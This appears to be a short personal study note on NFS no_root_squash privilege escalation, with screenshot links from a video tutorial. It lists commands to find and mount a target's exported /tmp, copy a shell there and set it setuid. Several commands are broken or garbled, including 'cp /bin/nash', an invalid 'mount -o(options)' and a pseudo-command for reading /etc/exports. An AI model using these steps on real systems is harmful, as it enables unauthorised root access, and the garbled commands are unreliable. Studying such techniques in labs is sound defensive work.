# NFS Misconfiguration

NETWORK FILE SHARE

```bash
nfs configurationfile = cat /etc/exports
```

**no_root_squash = protection disabled**

**root_squash = nfs protection**

**no_root_squash = privilege escalation** 

Eitar maddhome privilege escalate hobe

**Checking NFS enable or not**

```bash
nmap ip
showmount -e targetip

mkdir /mnt/tmp
mount -o(options) rw,vers=3 10.10.10.10:/tmp /mnt/tmp
cd /mnt/tmp
ls -la
```

```bash
cp /bin/nash .
ls -la
 chmod +sx ./bash
```

![2026-08-26 23_02_28-Network File Share (NFS) Misconfigurations __ Linux Privilege Escalation - YouTu.png](NFS%20Misconfiguration/2026-08-26_23_02_28-Network_File_Share_(NFS)_Misconfigurations____Linux_Privilege_Escalation_-_YouTu.png)

![2026-08-26 23_04_11-Network File Share (NFS) Misconfigurations __ Linux Privilege Escalation - YouTu.png](NFS%20Misconfiguration/2026-08-26_23_04_11-Network_File_Share_(NFS)_Misconfigurations____Linux_Privilege_Escalation_-_YouTu.png)

![2026-08-26 23_05_13-Network File Share (NFS) Misconfigurations __ Linux Privilege Escalation - YouTu.png](NFS%20Misconfiguration/2026-08-26_23_05_13-Network_File_Share_(NFS)_Misconfigurations____Linux_Privilege_Escalation_-_YouTu.png)